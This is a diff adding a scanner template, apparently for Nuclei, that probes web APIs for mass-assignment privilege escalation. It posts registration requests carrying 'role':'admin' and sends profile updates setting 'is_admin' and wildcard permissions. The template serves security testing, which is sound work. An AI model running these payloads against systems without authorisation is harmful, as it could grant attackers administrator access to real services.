@@ -1,0 +1,44 @@
+id: biz-privilege-escalation
+info:
+  name: Privilege Escalation via Role Tampering
+  author: dalisec
+  severity: critical
+  tags: business-logic,privilege-escalation,mass-assignment
+  description: Tests for vertical privilege escalation by injecting admin/role fields in registration and profile update endpoints.
+  reference:
+    - https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/register"
+      - "{{BaseURL}}/api/signup"
+      - "{{BaseURL}}/api/users"
+    headers:
+      Content-Type: "application/json"
+    body: '{"username":"fraytest","email":"fray@test.com","password":"Test1234!","role":"admin"}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200, 201]
+      - type: word
+        words: ["admin", "role", "created"]
+        part: body
+        condition: or
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/users/me"
+      - "{{BaseURL}}/api/account"
+    headers:
+      Content-Type: "application/json"
+    body: '{"role":"admin","is_admin":true,"permissions":["*"]}'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["admin", "updated", "success"]
+        part: body
+        condition: or
